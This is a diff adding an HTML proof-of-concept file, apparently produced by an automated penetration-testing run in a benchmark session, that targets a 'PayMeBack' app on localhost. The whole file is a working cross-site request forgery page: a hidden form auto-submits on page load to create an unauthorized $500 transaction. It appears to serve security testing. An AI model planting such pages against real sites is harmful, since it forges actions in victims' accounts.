@@ -1,0 +1,36 @@
+<!-- 
+POC: CSRF attack demonstrating unauthorized transaction creation on PayMeBack application. This HTML page, when visited by an authenticated user, will automatically submit a POST request to create a fraudulent transaction.
+Target: ./repo
+Created: 2025-12-02T16:22:01.793Z
+Session: benchmark-XBEN-093-24-miorxjqr
+
+To test this POC:
+1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-093-24-miorxjqr/pocs/poc_csrf_add_transaction.html
+2. Or serve it and navigate to the target application
+3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>CSRF Attack POC - Auto-submitting form</h1>
+    <p>This page demonstrates a CSRF vulnerability on the /add_transaction endpoint.</p>
+    
+    <!-- Hidden form that auto-submits to create unauthorized transaction -->
+    <form id="csrf_form" action="http://localhost:5000/add_transaction" method="POST" style="display:none;">
+        <input type="hidden" name="description" value="CSRFTest - Unauthorized Transaction">
+        <input type="hidden" name="amount" value="500">
+        <input type="hidden" name="category" value="Other">
+    </form>
+    
+    <script>
+        // Auto-submit the form when page loads
+        document.getElementById('csrf_form').submit();
+    </script>
+    
+    <p>If you are logged into the PayMeBack application, a transaction for $500 should have been created in your account.</p>
+</body>
+</html>
